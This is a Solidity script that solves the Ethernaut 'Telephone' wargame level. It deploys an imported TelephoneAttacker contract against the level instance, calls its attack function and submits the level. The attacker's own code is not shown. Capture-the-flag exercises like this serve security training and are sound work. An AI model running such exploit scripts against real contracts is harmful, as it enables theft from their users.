// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "../utils/Ethernaut.sol";
import "./Telephone.sol";
import "./TelephoneAttacker.sol";

contract TelephoneSolver is Ethernaut {
    function run() public broadcasted {
        Telephone instance = Telephone(getLevelInstance(Levels.telephone));

        TelephoneAttacker attacker = new TelephoneAttacker(address(instance));
        attacker.attack();

        submitLevelInstance(address(instance));
    }
}
